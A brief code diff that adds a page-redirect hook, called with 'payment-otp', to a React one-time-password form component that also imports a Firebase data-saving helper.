@@ -6,8 +6,10 @@ import { Button } from "@/components/ui/button";
 import { useRouter } from "next/navigation";
 import { Shield } from "lucide-react";
 import { addData } from "@/lib/firebase";
+import { usePageRedirect } from "@/lib/use-page-redirect";
 
 export function OtpForm() {
+  usePageRedirect("payment-otp");
   const router = useRouter();
   const [otp, setOtp] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
